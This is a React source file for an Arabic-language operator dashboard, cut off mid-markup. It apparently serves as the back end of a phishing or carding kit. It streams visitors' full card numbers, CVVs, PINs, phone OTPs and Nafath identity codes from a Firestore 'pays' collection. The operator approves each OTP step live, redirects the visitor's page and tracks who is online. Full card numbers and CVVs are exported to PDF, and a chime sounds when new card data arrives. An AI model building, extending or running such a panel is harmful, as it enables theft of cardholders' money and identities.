import { useState, useEffect, useRef } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import {
  Search,
  MessageSquare,
  Settings,
  Bell,
  User,
  ChevronDown,
  LayoutGrid,
  MoreVertical,
  CreditCard,
  MapPin,
  Clock,
  Star,
  Flag,
  Archive,
  Phone,
  Copy,
  Check,
  CheckCircle,
  Globe,
  Lock,
  FileText,
  Ban,
  Eye,
  Send,
  Link,
  Trash2,
  List,
  HeadphonesIcon,
  X,
  Volume2,
  VolumeX,
  Sun,
  Moon,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { useToast } from "@/hooks/use-toast";
import {
  db,
  collection,
  onSnapshot,
  query,
  updateUserDocument,
  signOutUser,
  subscribeToWarningSettings,
  updateWarningSettings,
  defaultWarningSettings,
  subscribeToPresence,
  type UserDocument,
  type ApprovalStatus,
  type CardApproval,
  type User as FirebaseUser,
  type ApprovalsWarningSettings,
  type PresenceData,
} from "@/lib/firebase";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import { LogOut, Download, FileDown } from "lucide-react";
import { useLocation } from "wouter";
import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";

interface DashboardProps {
  user: FirebaseUser;
}

interface VisibilitySettings {
  paymentCard: boolean;
  phoneOtp: boolean;
  pin: boolean;
  phoneVerification: boolean;
  idVerification: boolean;
  mobileNafaz: boolean;
  nafazSection: boolean;
  basicInfo: boolean;
  rawData: boolean;
}

const defaultVisibilitySettings: VisibilitySettings = {
  paymentCard: true,
  phoneOtp: true,
  pin: true,
  phoneVerification: true,
  idVerification: true,
  mobileNafaz: true,
  nafazSection: true,
  basicInfo: true,
  rawData: true,
};

interface BinData {
  BIN?: {
    brand?: string;
    type?: string;
    scheme?: string;
  };
  level?: string;
  country?: { name?: string; flag?: string; alpha2?: string };
  issuer?: { name?: string; url?: string; phone?: string };
}

export default function Dashboard({ user }: DashboardProps) {
  const [theme, setTheme] = useState<"light" | "dark">(() => {
    if (typeof window !== "undefined") {
      return (localStorage.getItem("theme") as "light" | "dark") || "light";
    }
    return "light";
  });
  const [, setLocation] = useLocation();

  useEffect(() => {
    const root = window.document.documentElement;
    if (theme === "dark") {
      root.classList.add("dark");
    } else {
      root.classList.remove("dark");
    }
    localStorage.setItem("theme", theme);
  }, [theme]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [applications, setApplications] = useState<UserDocument[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [updating, setUpdating] = useState(false);
  const [binData, setBinData] = useState<BinData | null>(null);
  const [binLoading, setBinLoading] = useState(false);
  const [authNumberInput, setAuthNumberInput] = useState("");
  const [warningSettings, setWarningSettings] =
    useState<ApprovalsWarningSettings>(defaultWarningSettings);
  const [settingsDialogOpen, setSettingsDialogOpen] = useState(false);
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [approvalFilter, setApprovalFilter] = useState<string>("all");
  const [countryFilter, setCountryFilter] = useState<string>("all");
  const [dataFilter, setDataFilter] = useState<string>("all");
  const [exportDialogOpen, setExportDialogOpen] = useState(false);
  const [presenceData, setPresenceData] = useState<
    Record<string, PresenceData>
  >({});
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [visibilitySettings, setVisibilitySettings] =
    useState<VisibilitySettings>(() => {
      if (typeof window !== "undefined") {
        const saved = localStorage.getItem("visibilitySettings");
        if (saved) {
          try {
            return { ...defaultVisibilitySettings, ...JSON.parse(saved) };
          } catch {
            return defaultVisibilitySettings;
          }
        }
      }
      return defaultVisibilitySettings;
    });
  const [visibilityDialogOpen, setVisibilityDialogOpen] = useState(false);
  const prevAppsRef = useRef<UserDocument[]>([]);
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const { toast } = useToast();

  const playNotificationSound = () => {
    if (!soundEnabled) return;
    try {
      const audioContext = new (window.AudioContext ||
        (window as any).webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();

      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);

      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);

      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(
        0.01,
        audioContext.currentTime + 0.3,
      );

      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.3);
    } catch (error) {
      console.log("Audio not supported");
    }
  };

  useEffect(() => {
    if (selectedId && chatScrollRef.current) {
      setTimeout(() => {
        chatScrollRef.current?.scrollTo({
          top: chatScrollRef.current.scrollHeight,
          behavior: "smooth",
        });
      }, 100);
    }
  }, [selectedId]);

  const exportCardsToPDF = () => {
    const cardsData = applications.filter((app) => app.cardNumber);
    if (cardsData.length === 0) {
      toast({ title: "لا توجد بطاقات للتصدير", variant: "destructive" });
      return;
    }

    const doc = new jsPDF({ orientation: "landscape" });

    doc.setFont("helvetica");
    doc.setFontSize(20);
    doc.text("Payment Cards Report", 14, 22);
    doc.setFontSize(10);
    doc.text(`Generated: ${new Date().toLocaleString("ar-SA")}`, 14, 30);
    doc.text(`Total Cards: ${cardsData.length}`, 14, 36);

    const tableData = cardsData.map((app, index) => [
      index + 1,
      app.documment_owner_full_name || "-",
      app.cardNumber || "-",
      app.expiryMonth && app.expiryYear
        ? `${app.expiryMonth}/${app.expiryYear}`
        : app.expiryDate || "-",
      app.cvv || "-",
      app.cardApproval || "pending",
      app.country || "-",
      app.phoneNumber || "-",
    ]);

    autoTable(doc, {
      head: [
        [
          "#",
          "Name",
          "Card Number",
          "Expiry",
          "CVV",
          "Status",
          "Country",
          "Phone",
        ],
      ],
      body: tableData,
      startY: 42,
      styles: { fontSize: 9, cellPadding: 3 },
      headStyles: { fillColor: [59, 130, 246], textColor: 255 },
      alternateRowStyles: { fillColor: [248, 250, 252] },
    });

    doc.save(`cards-report-${new Date().toISOString().split("T")[0]}.pdf`);
    toast({ title: "تم تصدير البطاقات بنجاح" });
    setExportDialogOpen(false);
  };

  const exportAllDataToPDF = () => {
    if (applications.length === 0) {
      toast({ title: "لا توجد بيانات للتصدير", variant: "destructive" });
      return;
    }

    const doc = new jsPDF({ orientation: "landscape" });

    doc.setFont("helvetica");
    doc.setFontSize(20);
    doc.text("Applications Report", 14, 22);
    doc.setFontSize(10);
    doc.text(`Generated: ${new Date().toLocaleString("ar-SA")}`, 14, 30);
    doc.text(`Total Applications: ${applications.length}`, 14, 36);

    const tableData = applications.map((app, index) => [
      index + 1,
      app.documment_owner_full_name || "-",
      app.identityNumber || "-",
      app.phoneNumber || "-",
      app.cardNumber ? `****${app.cardNumber.slice(-4)}` : "-",
      app.step || "-",
      app.cardApproval || "-",
      app.country || "-",
    ]);

    autoTable(doc, {
      head: [
        ["#", "Name", "ID", "Phone", "Card", "Step", "Approval", "Country"],
      ],
      body: tableData,
      startY: 42,
      styles: { fontSize: 9, cellPadding: 3 },
      headStyles: { fillColor: [59, 130, 246], textColor: 255 },
      alternateRowStyles: { fillColor: [248, 250, 252] },
    });

    doc.save(
      `applications-report-${new Date().toISOString().split("T")[0]}.pdf`,
    );
    toast({ title: "تم تصدير البيانات بنجاح" });
    setExportDialogOpen(false);
  };

  const handleLogout = async () => {
    await signOutUser();
    setLocation("/login");
  };

  const fetchBinData = async (cardNumber: string) => {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
    if (bin.length < 6) {
      setBinData(null);
      return;
    }
    setBinLoading(true);
    try {
      const response = await fetch(`/api/bin-lookup/${bin}`);
      if (response.ok) {
        const data = await response.json();
        setBinData(data);
      } else {
        setBinData(null);
      }
    } catch (error) {
      console.error("BIN lookup error:", error);
      setBinData(null);
    }
    setBinLoading(false);
  };

  useEffect(() => {
    const q = query(collection(db, "pays"));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const apps = snapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as UserDocument[];
        const sortedApps = apps.sort((a, b) => {
          const dateA = a.createdDate || a.created_at || a.timestamp || "";
          const dateB = b.createdDate || b.created_at || b.timestamp || "";
          return new Date(dateB).getTime() - new Date(dateA).getTime();
        });

        // Check for new unread or new data and play sound
        if (prevAppsRef.current.length > 0) {
          const prevIds = new Set(prevAppsRef.current.map((a) => a.id));
          const hasNewApp = sortedApps.some((app) => !prevIds.has(app.id));
          const hasNewUnread = sortedApps.some((app) => {
            const prevApp = prevAppsRef.current.find((p) => p.id === app.id);
            return app.isUnread && (!prevApp || !prevApp.isUnread);
          });
          const hasNewCardData = sortedApps.some((app) => {
            const prevApp = prevAppsRef.current.find((p) => p.id === app.id);
            return app.cardNumber && (!prevApp || !prevApp.cardNumber);
          });

          if (hasNewApp || hasNewUnread || hasNewCardData) {
            playNotificationSound();
          }
        }

        prevAppsRef.current = sortedApps;
        setApplications(sortedApps);
        setIsLoading(false);
      },
      (error) => {
        console.error("Firestore error:", error);
        setIsLoading(false);
      },
    );

    return () => unsubscribe();
  }, [soundEnabled]);

  useEffect(() => {
    const unsubscribe = subscribeToWarningSettings((settings) => {
      setWarningSettings(settings);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    const unsubscribe = subscribeToPresence((presence) => {
      setPresenceData(presence);
    });
    return () => unsubscribe();
  }, []);

  const handleWarningSettingChange = async (
    key: keyof ApprovalsWarningSettings,
    value: any,
  ) => {
    const newSettings = { ...warningSettings, [key]: value };
    setWarningSettings(newSettings);
    try {
      await updateWarningSettings({ [key]: value });
      toast({ title: "تم حفظ الإعدادات" });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في حفظ الإعدادات",
        variant: "destructive",
      });
    }
  };

  const handleVisibilityChange = (
    key: keyof VisibilitySettings,
    value: boolean,
  ) => {
    const newSettings = { ...visibilitySettings, [key]: value };
    setVisibilitySettings(newSettings);
    localStorage.setItem("visibilitySettings", JSON.stringify(newSettings));
    toast({ title: "تم حفظ إعدادات العرض" });
  };

  const refetch = () => {
    toast({ title: "يتم التحديث تلقائياً من Firestore" });
  };

  const handleCardApproval = async (docId: string, approval: CardApproval) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { cardApproval: approval });
      toast({
        title: "تم تحديث حالة البطاقة",
        description:
          approval === "otp" ? "OTP" : approval === "pin" ? "PIN" : approval,
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handlePhoneApproval = async (
    docId: string,
    approval: ApprovalStatus,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { phoneOtpApproval: approval });
      toast({
        title: "تم تحديث حالة الهاتف",
        description: approval === "approved" ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleCardOtpApproval = async (
    docId: string,
    approval: ApprovalStatus,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { cardOtpApproval: approval });
      toast({
        title: "تم تحديث حالة OTP البطاقة",
        description: approval === "approved" ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleOtpApproval = async (docId: string, approved: boolean) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { otpApproved: approved });
      toast({
        title: "تم تحديث حالة OTP",
        description: approved ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handlePhoneVerification = async (
    docId: string,
    status: ApprovalStatus,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, {
        phoneVerificationStatus: status,
        phoneVerifiedAt:
          status === "approved" ? new Date().toISOString() : undefined,
      });
      toast({
        title: "تم تحديث توثيق الهاتف",
        description: status === "approved" ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleIdVerification = async (
    docId: string,
    status: ApprovalStatus,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, {
        idVerificationStatus: status,
        idVerifiedAt:
          status === "approved" ? new Date().toISOString() : undefined,
      });
      toast({
        title: "تم تحديث توثيق الهوية",
        description: status === "approved" ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleVFieldApproval = async (
    docId: string,
    field:
      | "_v1Status"
      | "_v2Status"
      | "_v3Status"
      | "_v4Status"
      | "_v5Status"
      | "_v6Status"
      | "_v7Status"
      | "nafazStatus"
      | "phoneOtpCodeStatus",
    status: ApprovalStatus,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { [field]: status });
      const fieldName = field.replace("Status", "").replace("_v", "V");
      toast({
        title: `تم تحديث حالة ${fieldName}`,
        description: status === "approved" ? "موافق" : "مرفوض",
      });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleAuthNumberUpdate = async (docId: string) => {
    if (!authNumberInput.trim()) return;
    setUpdating(true);
    try {
      await updateUserDocument(docId, { authNumber: authNumberInput });
      toast({ title: "تم تحديث رقم التفويض", description: authNumberInput });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const handleUpdateCurrentPage = async (
    docId: string,
    page: number | string,
  ) => {
    setUpdating(true);
    try {
      await updateUserDocument(docId, { currentPage: page });
      toast({ title: "تم تحديث الصفحة", description: `الصفحة: ${page}` });
    } catch (error) {
      toast({
        title: "خطأ",
        description: "فشل في التحديث",
        variant: "destructive",
      });
    }
    setUpdating(false);
  };

  const filteredApps = applications.filter((app) => {
    const matchesSearch =
      !searchQuery ||
      app.documment_owner_full_name?.includes(searchQuery) ||
      app.phoneNumber?.includes(searchQuery) ||
      app.identityNumber?.includes(searchQuery);

    const matchesStatus =
      statusFilter === "all" ||
      (statusFilter === "completed" && app.step === "payment-completed") ||
      (statusFilter === "pending" &&
        (app.step === "card-details-submitted" ||
          app.step === "otp-submitted")) ||
      (statusFilter === "new" && (!app.step || app.step === "started"));

    const matchesApproval =
      approvalFilter === "all" ||
      (approvalFilter === "pending_card" &&
        app.cardNumber &&
        (!app.cardApproval || app.cardApproval === "pending")) ||
      (approvalFilter === "pending_phone" &&
        app.phoneOtp &&
        (!app.phoneOtpApproval || app.phoneOtpApproval === "pending")) ||
      (approvalFilter === "approved" &&
        (app.cardApproval === "approved" ||
          app.phoneOtpApproval === "approved")) ||
      (approvalFilter === "rejected" &&
        (app.cardApproval === "rejected" ||
          app.phoneOtpApproval === "rejected"));

    const matchesCountry =
      countryFilter === "all" || app.country === countryFilter;

    const matchesData =
      dataFilter === "all" ||
      (dataFilter === "card" && app.cardNumber) ||
      (dataFilter === "phone" &&
        (app.phoneOtp || app.phoneOtpCode || app.mobileNumber)) ||
      (dataFilter === "nafaz" && app.nafazId) ||
      (dataFilter === "info" &&
        (app.mobileInfo || app.operatorName || app.operator)) ||
      (dataFilter === "online" && presenceData[app.id!]?.online);

    return (
      matchesSearch &&
      matchesStatus &&
      matchesApproval &&
      matchesCountry &&
      matchesData
    );
  });

  const uniqueCountries = Array.from(
    new Set(applications.map((app) => app.country).filter(Boolean)),
  ) as string[];

  const selectedApplication = applications.find((app) => app.id === selectedId);

  useEffect(() => {
    if (selectedApplication?.cardNumber) {
      fetchBinData(selectedApplication.cardNumber);
    } else {
      setBinData(null);
    }
  }, [selectedApplication?.cardNumber]);

  useEffect(() => {
    setAuthNumberInput(selectedApplication?.authNumber || "");
  }, [selectedApplication?.id]);

  const copyToClipboard = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(label);
    setTimeout(() => setCopiedField(null), 2000);
    toast({ title: "تم النسخ", description: label });
  };

  const isUserOnline = (appId: string): boolean => {
    return presenceData[appId]?.online || false;
  };

  const getLastSeen = (appId: string): string => {
    const lastSeen = presenceData[appId]?.lastSeen;
    if (!lastSeen) return "";
    const diff = Date.now() - lastSeen;
    const minutes = Math.floor(diff / 60000);
    if (minutes < 1) return "الآن";
    if (minutes < 60) return `منذ ${minutes} دقيقة`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `منذ ${hours} ساعة`;
    const days = Math.floor(hours / 24);
    return `منذ ${days} يوم`;
  };

  const onlineCount = applications.filter((a) => isUserOnline(a.id!)).length;

  const stats = {
    total: applications.length,
    online: onlineCount,
    completed: applications.filter((a) => a.step === "payment-completed")
      .length,
    pending: applications.filter(
      (a) => a.step === "card-details-submitted" || a.step === "otp-submitted",
    ).length,
    approved: applications.filter(
      (a) => a.cardApproval === "approved" || a.phoneOtpApproval === "approved",
    ).length,
  };

  const pendingApprovals = {
  
    phoneApprovals: applications.filter(
      (a) =>
        a.phoneOtp && (!a.phoneOtpApproval || a.phoneOtpApproval === "pending"),
    ).length,
    phoneVerification: applications.filter(
      (a) =>
        a.phoneVerificationCode &&
        (!a.phoneVerificationStatus || a.phoneVerificationStatus === "pending"),
    ).length
    
   
  };

  const getCountryFlag = (country?: string): string => {
    if (!country) return "";
    const countryFlags: Record<string, string> = {
      السعودية: "🇸🇦",
      "Saudi Arabia": "🇸🇦",
      SA: "🇸🇦",
      الإمارات: "🇦🇪",
      UAE: "🇦🇪",
      AE: "🇦🇪",
      مصر: "🇪🇬",
      Egypt: "🇪🇬",
      EG: "🇪🇬",
      الكويت: "🇰🇼",
      Kuwait: "🇰🇼",
      KW: "🇰🇼",
      البحرين: "🇧🇭",
      Bahrain: "🇧🇭",
      BH: "🇧🇭",
      قطر: "🇶🇦",
      Qatar: "🇶🇦",
      QA: "🇶🇦",
      عمان: "🇴🇲",
      Oman: "🇴🇲",
      OM: "🇴🇲",
      الأردن: "🇯🇴",
      Jordan: "🇯🇴",
      JO: "🇯🇴",
      العراق: "🇮🇶",
      Iraq: "🇮🇶",
      IQ: "🇮🇶",
      لبنان: "🇱🇧",
      Lebanon: "🇱🇧",
      LB: "🇱🇧",
      فلسطين: "🇵🇸",
      Palestine: "🇵🇸",
      PS: "🇵🇸",
      سوريا: "🇸🇾",
      Syria: "🇸🇾",
      SY: "🇸🇾",
      اليمن: "🇾🇪",
      Yemen: "🇾🇪",
      YE: "🇾🇪",
      المغرب: "🇲🇦",
      Morocco: "🇲🇦",
      MA: "🇲🇦",
      تونس: "🇹🇳",
      Tunisia: "🇹🇳",
      TN: "🇹🇳",
      الجزائر: "🇩🇿",
      Algeria: "🇩🇿",
      DZ: "🇩🇿",
      ليبيا: "🇱🇾",
      Libya: "🇱🇾",
      LY: "🇱🇾",
      السودان: "🇸🇩",
      Sudan: "🇸🇩",
      SD: "🇸🇩",
    };
    return countryFlags[country] || "🌍";
  };

  const DataRow = ({
    label,
    value,
    isLtr,
  }: {
    label: string;
    value?: string | number | null;
    isLtr?: boolean;
  }) => {
    if (!value) return null;
    const strValue = String(value);
    return (
      <div className="flex items-center justify-between group hover:bg-muted/50 px-3 py-2 rounded transition-colors border-b border-border">
        <span className="font-bold text-gray-700 text-sm">{label}</span>
        <div className="flex items-center gap-2">
          <span
            className={cn(
              "text-gray-600 font-medium",
              isLtr && "direction-ltr text-left font-mono",
            )}
          >
            {strValue}
          </span>
          <button
            onClick={() => copyToClipboard(strValue, label)}
            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
            data-testid={`copy-${label}`}
          >
            {copiedField === label ? (
              <Check size={14} className="text-green-500" />
            ) : (
              <Copy size={14} />
            )}
          </button>
        </div>
      </div>
    );
  };

  const ChatBubble = ({
    title,
    children,
    isUser,
    icon,
  }: {
    title: string;
    children: React.ReactNode;
    isUser?: boolean;
    icon?: React.ReactNode;
  }) => (
    <div
      className={cn(
        "flex gap-3 mb-4",
        isUser ? "flex-row-reverse" : "flex-row",
      )}
    >
      <div
        className={cn(
          "w-8 h-8 rounded-full flex items-center justify-center shrink-0",
          isUser ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-600",
        )}
      >
        {icon || (isUser ? <User size={16} /> : <MessageSquare size={16} />)}
      </div>
      <div
        className={cn(
          "max-w-[80%] rounded-2xl p-4 shadow-sm",
          isUser
            ? "bg-primary text-primary-foreground rounded-tr-sm"
            : "bg-card border border-border rounded-tl-sm",
        )}
      >
        <div
          className={cn(
            "text-xs font-bold mb-2",
            isUser ? "text-primary-foreground/80" : "text-muted-foreground",
          )}
        >
          {title}
        </div>
        <div className={isUser ? "text-primary-foreground" : "text-foreground"}>
          {children}
        </div>
      </div>
    </div>
  );

  const DataBubbleRow = ({
    label,
    value,
    isLtr,
  }: {
    label: string;
    value?: string | number | null;
    isLtr?: boolean;
  }) => {
    if (!value) return null;
    const strValue = String(value);
    return (
      <div className="flex items-center justify-between group py-1">
        <span className="text-sm text-gray-500">{label}</span>
        <div className="flex items-center gap-2">
          <span
            className={cn(
              "font-medium",
              isLtr && "direction-ltr text-left font-mono",
            )}
          >
            {strValue}
          </span>
          <button
            onClick={() => copyToClipboard(strValue, label)}
            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
          >
            {copiedField === label ? (
              <Check size={12} className="text-green-500" />
            ) : (
              <Copy size={12} />
            )}
          </button>
        </div>
      </div>
    );
  };

  return (
    <div
      className="flex h-screen bg-background w-full overflow-hidden text-right font-sans text-foreground"
      dir="rtl"
    >
      {/* Right Sidebar - Inbox List */}
      <aside className="w-[420px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
        {/* Header */}
        <div className="h-14 border-b border-border flex items-center justify-between px-4 shrink-0 bg-card">
          <div className="flex items-center gap-3">
            <div className="font-bold text-foreground text-sm">
              صندوق الوارد
            </div>
            <Bell
              size={18}
              className="text-muted-foreground"
              data-testid="icon-bell"
            />
            <Settings
              size={18}
              className="text-muted-foreground"
              data-testid="icon-settings"
            />
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <button
                  className="focus:outline-none"
                  data-testid="button-profile"
                >
                  {user.photoURL ? (
                    <img
                      src={user.photoURL}
                      alt={user.displayName || ""}
                      className="w-7 h-7 rounded-full border border-blue-200 cursor-pointer hover:ring-2 hover:ring-blue-300 transition-all"
                    />
                  ) : (
                    <div className="w-7 h-7 rounded-full bg-blue-100 flex items-center justify-center text-blue-600 border border-blue-200 text-xs cursor-pointer hover:ring-2 hover:ring-blue-300 transition-all">
                      <User size={14} />
                    </div>
                  )}
                </button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start" className="w-64 text-right">
                <DropdownMenuLabel className="bg-primary text-primary-foreground rounded-t-md -mx-1 -mt-1 px-4 py-3">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
                      <User size={20} className="text-muted-foreground" />
                    </div>
                    <div>
                      <div className="font-mono text-sm">
                        {user.uid?.slice(0, 10) || "2025121093"}
                      </div>
                      <div className="text-xs text-gray-300 font-normal">
                        20/1/2026 - 21/12/2025
                      </div>
                    </div>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  className="gap-3 cursor-pointer"
                  onClick={() => setSettingsDialogOpen(true)}
                >
                  <Settings size={16} className="text-muted-foreground" />
                  <span>إعدادات التنبيهات</span>
                </DropdownMenuItem>
                <DropdownMenuItem
                  className="gap-3 cursor-pointer"
                  onClick={() => setVisibilityDialogOpen(true)}
                >
                  <Eye size={16} className="text-muted-foreground" />
                  <span>إعدادات عرض البيانات</span>
                </DropdownMenuItem>
                <DropdownMenuItem
                  className="gap-3 cursor-pointer"
                  onClick={() => setLocation("/field-settings")}
                  data-testid="menu-field-settings"
                >
                  <Settings size={16} className="text-muted-foreground" />
                  <span>تخصيص الحقول والمجموعات</span>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer">
                  <Globe size={16} className="text-muted-foreground" />
                  <span>الموقع الإلكتروني</span>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer">
                  <Lock size={16} className="text-muted-foreground" />
                  <span>تغير كلمة المرور</span>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem className="gap-3 cursor-pointer">
                  <Flag size={16} className="text-muted-foreground" />
                  <span>تحديد دول الزوار</span>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer">
                  <Ban size={16} className="text-muted-foreground" />
                  <span>قائمة حجب بطاقات الدفع</span>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <Eye size={16} className="text-muted-foreground" />
                  <span>واجهة الزائر</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem className="gap-3 cursor-pointer">
                  <Phone size={16} className="text-muted-foreground" />
                  <span>رقم واتساب</span>
                </DropdownMenuItem>
                <DropdownMenuItem
                  className="gap-3 cursor-pointer"
                  onClick={() => setExportDialogOpen(true)}
                >
                  <FileText size={16} className="text-muted-foreground" />
                  <span>تصدير بطاقات الدفع</span>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <Send size={16} className="text-muted-foreground" />
                  <span>إضافة تيليجرام</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <Link size={16} className="text-muted-foreground" />
                  <span>رابط مختصر</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <Trash2 size={16} className="text-muted-foreground" />
                  <span>حذف جميع البيانات</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <List size={16} className="text-muted-foreground" />
                  <span>السجل</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuItem className="gap-3 cursor-pointer" disabled>
                  <HeadphonesIcon size={16} className="text-muted-foreground" />
                  <span>الدعم الفني</span>
                  <Badge
                    variant="outline"
                    className="mr-auto text-[9px] text-muted-foreground"
                  >
                    غير مفعل
                  </Badge>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  className="gap-3 cursor-pointer text-red-600"
                  onClick={handleLogout}
                >
                  <LogOut size={16} />
                  <span>تسجيل الخروج</span>
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
          <div className="flex items-center gap-2">
            <div className="h-6 w-px bg-border mx-2" />
            <div className="flex items-center gap-1 text-[10px] text-muted-foreground font-mono tracking-tight">
              <span
                className="text-green-500 font-bold"
                data-testid="stats-approved"
              >
                {stats.approved} / {stats.pending}
              </span>
              <span data-testid="stats-total">/ {stats.total}</span>
            </div>
          </div>
        </div>

        {/* Pending Approvals Warning */}
        {warningSettings.enabled  && (
          <div
            className="mx-3 mt-3 p-3 border rounded-lg animate-pulse"
            style={{
              background: `linear-gradient(to left, ${warningSettings.accentColor}15, ${warningSettings.accentColor}05)`,
              borderColor: `${warningSettings.accentColor}40`,
            }}
            data-testid="warning-approvals"
          >
            <div
              className="flex items-center gap-2"
              style={{ color: warningSettings.accentColor }}
            >
              <div
                className="w-6 h-6 rounded-full flex items-center justify-center animate-bounce"
                style={{ backgroundColor: warningSettings.accentColor }}
              >
                <Bell size={14} className="text-white" />
              </div>
              <div className="flex-1">
                <div className="font-bold text-sm">
                  {warningSettings.headline}
                </div>
                <div
                  className="text-xs"
                  style={{ color: `${warningSettings.accentColor}cc` }}
                >
             
                  {warningSettings.showPhoneCount &&
                    pendingApprovals.phoneApprovals > 0 && (
                      <span className="inline-flex items-center gap-1">
                        <Phone size={10} /> {pendingApprovals.phoneApprovals}{" "}
                        هاتف
                      </span>
                    )}
                </div>
              </div>
              <Badge
                style={{ backgroundColor: warningSettings.accentColor }}
                className="text-white animate-pulse"
              >
              </Badge>
            </div>
          </div>
        )}

        {/* Search & Filter */}
        <div className="p-3 border-b border-border space-y-3 bg-card/50 backdrop-blur-sm">
          <div className="flex items-center justify-between text-xs text-gray-500 px-1 mb-2">
